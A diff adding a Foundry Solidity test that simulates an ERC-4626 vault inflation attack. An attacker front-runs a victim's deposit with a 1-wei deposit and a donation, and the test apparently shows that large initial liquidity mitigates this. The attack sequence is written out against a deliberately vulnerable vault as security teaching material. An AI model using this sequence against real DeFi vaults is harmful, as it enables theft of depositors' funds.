@@ -1,0 +1,74 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "src/Token/EIP-4626-inflation-attack/Asset.sol";
+import "src/Token/EIP-4626-inflation-attack/Valout.sol";
+import "src/Token/EIP-4626-inflation-attack/VulnerableValout.sol";
+
+contract Attack is Test {
+    // Mittigationwith liquidity
+    address liquidityProvider = 0x1c738175d6391321D2eE5746f22A1Eb01117bd3E;
+    address alice = 0x83563f56957D039abB72C679aD277F0CB1f720Ef;
+    address bob = 0xaFfa4F2906fb9315331943837773d19bC0804601;
+
+    IERC20 asset;
+    IERC4626 valout;
+
+    function setUp() public {
+        asset = new Asset(100003 ether);
+        valout = new VulnerableValout(asset);
+        asset.transfer(bob, 2 ether);
+        asset.transfer(alice, 1 ether);
+
+        // Mint inital liquidity
+        asset.approve(address(valout), 100000 ether);
+        valout.deposit(100000 ether, liquidityProvider);
+    }
+
+    function test_TheAttackCanBeMitigatedWithEnoughtLiquidityInTheValout() public {
+        console.log("Initial Bob asset balance", asset.balanceOf(bob));
+        console.log("Initial Alice asset balance", asset.balanceOf(alice));
+
+        // Alice check the price
+        console.log("Price that Alice sees:", valout.convertToShares(1 ether));
+
+        /* Front Running tx */
+        vm.startPrank(bob);
+
+        // Bob deposits 1 wei of asset
+        asset.approve(address(valout), 1 ether);
+        valout.deposit(1 wei, bob);
+        // Bob donates 1 token asset (1e18 wei) to manipulate the price of the share
+        asset.transfer(address(valout), 1 ether);
+        console.log("Price after bob manipulation", valout.convertToShares(1 ether));
+
+        vm.stopPrank();
+
+        /* Front Runned tx */
+        vm.startPrank(alice);
+
+        // Alice deposit
+        asset.approve(address(valout), 1 ether);
+        valout.deposit(1 ether, alice);
+
+        vm.stopPrank();
+
+        /* Bob drains all assets from the contract */
+        vm.startPrank(bob);
+
+        valout.redeem(valout.balanceOf(bob), bob, bob);
+
+        vm.stopPrank();
+
+        /* Alice redeem*/
+        vm.startPrank(alice);
+
+        valout.redeem(valout.balanceOf(alice), alice, alice);
+
+        vm.stopPrank();
+
+        console.log("Final Bob asset balance", asset.balanceOf(bob));
+        console.log("Final Alice asset balance", asset.balanceOf(alice));
+    }
+}
